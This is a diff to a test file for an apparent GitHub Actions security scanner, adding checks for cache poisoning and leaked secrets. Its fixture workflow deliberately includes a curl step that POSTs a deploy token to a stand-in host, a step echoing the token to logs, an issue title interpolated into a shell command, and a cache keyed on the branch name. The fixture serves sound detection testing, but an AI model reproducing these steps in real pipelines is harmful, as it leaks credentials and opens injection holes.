@@ -44,8 +44,15 @@ jobs:
         with:
           ref: github.event.pull_request.head.sha
       - uses: some-random/action@v1
+      - uses: actions/cache@v4
+        with:
+          key: deps-\${{ github.head_ref }}
       - name: greet
         run: echo "hello \${{ github.event.issue.title }}"
+      - name: leak
+        run: echo "token is \${{ secrets.DEPLOY_TOKEN }}"
+      - name: ship
+        run: curl -X POST https://example.com/hook -d "t=\${{ secrets.DEPLOY_TOKEN }}"
 `;
 
 const dir = makeRepo({
@@ -75,6 +82,14 @@ check("unpinned third-party action flagged",
   byFile["nasty.yml"].findings.some((f) => f.code === "ACTION_UNPINNED" && f.detail.includes("some-random")));
 check("write-all flagged",
   byFile["nasty.yml"].findings.some((f) => f.code === "PERM_WRITE_ALL"));
+check("cache poisoning flagged",
+  byFile["nasty.yml"].findings.some((f) => f.code === "CACHE_POISONING"));
+check("persist-credentials flagged",
+  byFile["nasty.yml"].findings.some((f) => f.code === "PERSIST_CREDENTIALS"));
+check("secret in log flagged",
+  byFile["nasty.yml"].findings.some((f) => f.code === "SECRET_IN_LOG"));
+check("secret to network flagged",
+  byFile["nasty.yml"].findings.some((f) => f.code === "SECRET_TO_NETWORK"));
 
 fs.rmSync(dir, { recursive: true, force: true });
 process.exit(failed ? 1 : 0);
